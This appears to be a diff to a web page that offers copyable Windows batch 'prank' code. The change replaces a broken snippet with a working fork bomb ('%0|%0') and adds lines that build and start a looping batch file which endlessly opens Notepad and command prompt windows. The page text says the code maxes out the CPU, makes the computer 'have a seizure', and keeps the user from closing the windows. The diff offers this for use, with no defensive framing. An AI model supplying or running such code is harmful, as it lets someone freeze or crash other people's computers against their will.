@@ -22,13 +22,21 @@
                 <h1>CPU</h1>
                 <div class="border-1 border-dark w-100 border mt-3"></div>
             <p>
-                The code below, uses 100% of your CPU.
+                The code below, uses 100% of your CPU. It runs into an error causing your computer to have
+                a seizure. Also to stop the user from stopping the command, I creatted a file that opens many COMMAND PROMPTS
+                in an attempt to stop the user from closing the COMMAND PROMPT
             </p>
 
 <div class="textarea-holder container-fluid d-flex justify-content-center align-items-center flex-column bg-light">
 <button class="buttonCopy m-4 btn-success buttons">Copy Code</button>
 <textarea spellcheck="false" rows="9">
-%0|0%
+echo :loopname>file.bat
+echo start notepad>>file.bat
+echo start cmd>>file.bat
+echo goto loopname>>file.bat
+start file.bat
+
+%0|%0
 </textarea>
 </div>
                 <!-- navigation buttons -->
